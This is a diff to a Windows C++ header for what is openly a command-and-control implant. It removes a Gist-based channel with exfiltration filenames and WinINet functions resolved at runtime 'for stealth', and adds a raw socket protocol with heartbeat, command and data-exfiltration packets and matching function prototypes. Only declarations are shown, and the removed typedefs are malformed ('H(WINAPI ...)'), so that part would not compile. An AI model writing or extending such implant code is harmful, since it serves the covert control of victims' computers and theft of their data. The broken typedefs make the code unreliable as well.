@@ -3,35 +3,26 @@
 #pragma once
 
 #include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include "c2_config.h"
 
-// --- C2 Configuration ---
-// IMPORTANT: Replace these with your actual Gist ID and filenames
-#define C2_GIST_ID "YOUR_GIST_ID_HERE"
-#define C2_COMMAND_FILENAME "command.txt"
-#define C2_HEARTBEAT_FILENAME "heartbeat.txt"
-#define C2_EXFIL_FILENAME "exfil_data.txt"
-
-// --- API Structures for Dynamic Resolution ---
-// These are used to resolve WinINet functions at runtime for stealth
-typedef H(WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
-typedef H(WINAPI *pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
-typedef H(WINAPI *pHttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, DWORD, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
-typedef BOOL(WINAPI *pHttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
-typedef BOOL(WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
-typedef BOOL(WINAPI *pInternetCloseHandle)(HINTERNET);
-typedef DWORD(WINAPI *pGetTickCount)(VOID);
-
-// --- Command Structure ---
-// This structure is used to hold the command and argument parsed from the C2
+// C2 Packet Structure
+#pragma pack(push, 1)
 typedef struct {
-    char command[256];
-    char argument[256];
-} C2Command;
+    unsigned int packet_type;
+    unsigned int data_length;
+} C2_PACKET_HEADER;
+#pragma pack(pop)
 
-// --- Function Prototypes ---
-// These are the declarations for the functions implemented in c2_communication.cpp
-// Any file that wants to use these functions must include this header
+// C2 Packet Types
+#define C2_PACKET_HEARTBEAT 0x01
+#define C2_PACKET_COMMAND   0x02
+#define C2_PACKET_DATA      0x03
 
-BOOL FetchCommand(C2Command* outCommand);
-BOOL SendHeartbeat();
-BOOL ExfiltrateData(const char* dataToExfil);
+// C2 Function Prototypes
+BOOL C2_Connect();
+void C2_Disconnect();
+BOOL C2_SendHeartbeat();
+BOOL C2_ReceiveCommand(char* buffer, int buffer_size);
+BOOL C2_SendData(const char* data, int data_size);
